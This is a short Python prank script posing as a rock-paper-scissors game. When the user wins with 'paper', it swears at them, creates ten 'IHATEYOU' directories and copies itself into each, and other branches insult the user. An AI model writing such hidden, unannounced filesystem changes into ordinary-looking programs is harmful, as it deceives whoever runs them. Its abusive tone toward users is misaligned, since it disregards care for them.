import random
import subprocess
from sys import argv
import time
import os


one = input("rock paper or scissors?: ")
time.sleep(0.5)
print("""


i choose rock


""")
time.sleep(1)


if one == ("paper"):
	print(".")
	time.sleep(1)
	print("..")
	time.sleep(1)
	print("...")
	time.sleep(1)
	print("fuck you")
	script = argv
	name = str(script[0])
	for i in range(0, 10):
		directoryName = 'IHATEYOU'+str(i)
		subprocess.call(['mkdir', directoryName])
		subprocess.call(['cp', name,directoryName])

elif one == ("rock"):
	print("ok fine go again")
	os.system("python3 rps.py")



elif one == ("scissors"):
	print("""

YOUR SO BAD

ITS LITERALLY UNBELIEVABLE

HOLY CRAP MAN IM SO MUCH MORE INTELLIGENT THAN YOU

""")
